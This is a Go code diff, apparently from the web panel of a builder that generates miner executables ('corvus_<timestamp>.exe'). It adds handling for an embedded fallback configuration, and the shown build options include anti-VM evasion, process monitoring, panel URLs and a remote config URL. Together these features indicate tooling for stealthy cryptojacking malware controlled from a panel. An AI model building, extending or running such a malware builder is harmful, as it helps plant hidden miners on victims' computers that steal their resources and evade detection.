@@ -24,7 +24,9 @@ type BuildRequest struct {
 	PanelURLs         string `json:"panel_urls"`
 	ConfigURL         string `json:"config_url"`
 	ContractAddress   string `json:"contract_address"`
-	EmbeddedConfig    string `json:"embedded_config"` // "auto" or "none"
+	EmbeddedConfig    string `json:"embedded_config"` // legacy: "auto"/"none"
+	EmbeddedMode      string `json:"embedded_mode"`   // none | panel | custom
+	EmbeddedJSON      string `json:"embedded_json"`   // used when mode == custom
 	ProcessMonitoring bool   `json:"process_monitoring"`
 	DebugConsole      bool   `json:"debug_console"`
 	AntiVM            bool   `json:"anti_vm"`
@@ -321,11 +323,26 @@ func (h *Handler) BuildMiner(w http.ResponseWriter, r *http.Request) {
 		name = fmt.Sprintf("corvus_%d.exe", time.Now().Unix())
 	}
 
+	// Render the stored fallback config (or the posted one) to a temp file. The
+	// mode comes from the UI; an older page that only sends "auto"/"none" is
+	// mapped onto panel/none.
+	embeddedPath, cleanupEmbedded, err := h.materializeEmbeddedConfig(req.EmbeddedMode, req.EmbeddedJSON, req.EmbeddedConfig)
+	if err != nil {
+		writeBuildError(w, http.StatusBadRequest, "Fallback config: "+err.Error(), "")
+		return
+	}
+	defer cleanupEmbedded()
+	embeddedSetting := embeddedModeNone
+	if embeddedPath != "" {
+		embeddedSetting = embeddedPath
+		log.Printf("Embedding fallback config for build %s", name)
+	}
+
 	spec := buildSpec{
 		PanelURLs:         req.PanelURLs,
 		ConfigURL:         req.ConfigURL,
 		ContractAddress:   req.ContractAddress,
-		EmbeddedConfig:    req.EmbeddedConfig,
+		EmbeddedConfig:    embeddedSetting,
 		ProcessMonitoring: req.ProcessMonitoring,
 		DebugConsole:      req.DebugConsole,
 		AntiVM:            req.AntiVM,
@@ -469,9 +486,21 @@ func (h *Handler) BuilderPage(w http.ResponseWriter, r *http.Request) {
 		scheme = "https"
 	}
 
+	embMode, embCustom, _ := h.loadEmbeddedSetting()
+	embDerived, derivedErr := h.derivedEmbeddedConfig()
+	if derivedErr != nil {
+		embDerived = ""
+	}
+	if embMode == embeddedModePanel {
+		embCustom = embDerived
+	}
+
 	data := map[string]any{
 		"quote":           getRandomQuote(),
 		"builds":          h.listBuilds(),
+		"embeddedMode":    embMode,
+		"embeddedJSON":    embCustom,
+		"embeddedDerived": embDerived,
 		"builderReady":    builderErr == nil && clientErr == nil,
 		"builderPath":     builderPath,
 		"builderBackend":  backendLabel,
